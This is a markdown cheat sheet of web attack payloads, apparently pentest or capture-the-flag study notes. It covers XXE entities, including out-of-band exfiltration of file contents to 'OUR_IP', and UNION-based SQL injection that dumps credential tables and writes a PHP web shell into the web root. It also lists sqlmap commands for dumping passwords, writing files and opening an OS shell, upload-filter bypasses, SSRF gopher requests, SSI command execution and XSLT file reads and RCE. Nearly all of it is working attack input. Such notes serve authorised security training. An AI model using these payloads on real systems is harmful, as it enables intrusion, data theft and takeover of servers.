# security/web-primitives.md

## HTTP verb tampering
### Send an OPTIONS request with curl
    curl -X OPTIONS http://SERVER_IP:PORT/

## IDOR heuristics
- URL parameters & APIs
- AJAX calls
- reference hashing/encoding
- comparing user roles

### Hash/encode helpers
    md5sum
    base64

## XXE payloads (entity definitions)
    <!ENTITY xxe SYSTEM "http://localhost/email.dtd">
    <!ENTITY xxe SYSTEM "file:///etc/passwd">
    <!ENTITY company SYSTEM "php://filter/convert.base64-encode/resource=index.php">
    <!ENTITY % error "<!ENTITY content SYSTEM '%nonExistingEntity;/%file;'>">
    <!ENTITY % oob "<!ENTITY content SYSTEM 'http://OUR_IP:8000/?content=%file;'>">

## SQL injection (MySQL) primitives
### Detect columns / UNION
    ' order by 1-- -
    cn' UNION select 1,2,3-- -
    cn' UNION select 1,@@version,3,4-- -
    UNION select username, 2, 3, 4 from passwords-- -

### DB enumeration
    SELECT @@version
    SELECT SLEEP(5)
    cn' UNION select 1,database(),2,3-- -
    cn' UNION select 1,schema_name,3,4 from INFORMATION_SCHEMA.SCHEMATA-- -
    cn' UNION select 1,TABLE_NAME,TABLE_SCHEMA,4 from INFORMATION_SCHEMA.TABLES where table_schema='dev'-- -
    cn' UNION select 1,COLUMN_NAME,TABLE_NAME,TABLE_SCHEMA from INFORMATION_SCHEMA.COLUMNS where table_name='credentials'-- -
    cn' UNION select 1, username, password, 4 from dev.credentials-- -

### Privileges / file write capability checks
    cn' UNION SELECT 1, user(), 3, 4-- -
    cn' UNION SELECT 1, super_priv, 3, 4 FROM mysql.user WHERE user="root"-- -
    cn' UNION SELECT 1, grantee, privilege_type, is_grantable FROM information_schema.user_privileges WHERE grantee="'root'@'localhost'"-- -
    cn' UNION SELECT 1, variable_name, variable_value, 4 FROM information_schema.global_variables where variable_name="secure_file_priv"-- -

### File read/write via SQLi
    cn' UNION SELECT 1, LOAD_FILE("/etc/passwd"), 3, 4-- -
    select 'file written successfully!' into outfile '/var/www/html/proof.txt'
    cn' union select "",'<?php system($_REQUEST[0]); ?>', "", "" into outfile '/var/www/html/shell.php'-- -

## SQLMap (SQLi automation)
### Run non-interactively
    sqlmap -u "http://www.example.com/vuln.php?id=1" --batch

### POST body
    sqlmap 'http://www.example.com/' --data 'uid=1&name=test'
    sqlmap 'http://www.example.com/' --data 'uid=1*&name=test'    # injection point with *

### Request file / headers / method
    sqlmap -r req.txt
    sqlmap ... --cookie='PHPSESSID=ab4530f4a7d10448457fa8b0eadac29c'
    sqlmap -u www.target.com --data='id=1' --method PUT

### Output / verbosity
    sqlmap -u "http://www.target.com/vuln.php?id=1" --batch -t /tmp/traffic.txt
    sqlmap -u "http://www.target.com/vuln.php?id=1" -v 6 --batch

### Prefix/suffix
    sqlmap -u "www.example.com/?q=test" --prefix="%'))" --suffix="-- -"

### Level/risk
    sqlmap -u www.example.com/?id=1 -v 3 --level=5

### Enumeration
    sqlmap -u "http://www.example.com/?id=1" --banner --current-user --current-db --is-dba
    sqlmap -u "http://www.example.com/?id=1" --tables -D testdb
    sqlmap -u "http://www.example.com/?id=1" --dump -T users -D testdb -C name,surname
    sqlmap -u "http://www.example.com/?id=1" --dump -T users -D testdb --where="name LIKE 'f%'"
    sqlmap -u "http://www.example.com/?id=1" --schema
    sqlmap -u "http://www.example.com/?id=1" --search -T user
    sqlmap -u "http://www.example.com/?id=1" --passwords --batch

### Anti-CSRF token bypass
    sqlmap -u "http://www.example.com/" --data="id=1&csrf-token=WfF1szMUHhiokx9AHFply5L2xAOfjRkE" --csrf-token="csrf-token"

### Tamper scripts inventory
    sqlmap --list-tampers

### File read/write / OS shell
    sqlmap -u "http://www.example.com/?id=1" --file-read "/etc/passwd"
    sqlmap -u "http://www.example.com/?id=1" --file-write "shell.php" --file-dest "/var/www/html/shell.php"
    sqlmap -u "http://www.example.com/?id=1" --os-shell

### User-agent blacklisting bypass
    sqlmap ... --random-agent

## File upload bypass patterns
### Whitelist bypass (extensions)
    shell.jpg.php
    shell.php.jpg
    shell.phar.jpg

### Character injection around extension
    %20
    %0a
    %00
    %0d0a
    /
    .\
    .
    …

### References
- Content types list: https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/web-all-content-types.txt
- File signatures / magic bytes: https://en.wikipedia.org/wiki/List_of_file_signatures

## Limited upload file types (attack surface mapping)
- XSS: HTML, JS, SVG, GIF
- XXE/SSRF: XML, SVG, PDF, PPT, DOC
- DoS: ZIP, JPG, PNG

## SSRF payloads / protocol probes
    http://127.0.0.1/
    file:///etc/passwd
    gopher://dateserver.htb:80/_POST%20/admin.php%20HTTP%2F1.1%0D%0AHost:%20dateserver.htb%0D%0AContent-Length:%2013%0D%0AContent-Type:%20application/x-www-form-urlencoded%0D%0A%0D%0Aadminpw%3Dadmin

## SSTI detection string
    ${{<%[%'"}}%\.

## SSI injection directives
    <!--#printenv -->
    <!--#config errmsg="Error!" -->
    <!--#echo var="DOCUMENT_NAME" var="DATE_LOCAL" -->
    <!--#exec cmd="whoami" -->
    <!--#include virtual="index.html" -->

## XSLT injection payloads
### Info leak via system-property
    <xsl:value-of select="system-property('xsl:vendor')" />
    <xsl:value-of select="system-property('xsl:vendor-url')" />
    <xsl:value-of select="system-property('xsl:product-name')" />
    <xsl:value-of select="system-property('xsl:product-version')" />

### LFI via XSLT
    <xsl:value-of select="unparsed-text('/etc/passwd', 'utf-8')" />
    <xsl:value-of select="php:function('file_get_contents','/etc/passwd')" />

### RCE via XSLT (PHP function)
    <xsl:value-of select="php:function('system','id')" />
